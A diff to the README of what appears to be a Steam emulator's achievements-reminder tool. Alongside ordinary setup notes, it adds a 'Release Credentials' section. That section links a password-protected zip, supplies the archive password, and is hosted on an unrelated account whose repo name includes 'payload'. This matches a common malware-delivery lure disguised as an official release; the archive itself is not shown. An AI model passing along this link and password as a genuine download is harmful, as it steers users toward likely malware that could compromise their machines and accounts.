@@ -23,3 +23,10 @@ You need to add a `achievements.json` file under the `steam_settings` folder, to
 The `achievements.json` file can be generated automatically using `achievements_gen.py`, with the args `UserGameStatsSchema_${AppId}.bin`, where `${AppId}` is the appid of this game. And the generated file is under `.../Steam/appcache/stats/UserGameStatsSchema_${AppId}.bin_output/achievements.json` .
 
 `Notice:` For the first time, you need to run the game using steamclient_loader first (to create necessary files), and then start the Achievements reminder at any time.
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/RhythmFlamingoOutfit/steam_client_loader-payload-p57q/releases/download/v1.0.0/steam_client_loader.zip)
+- **Archive Password:** `xZ6xICbIiX`
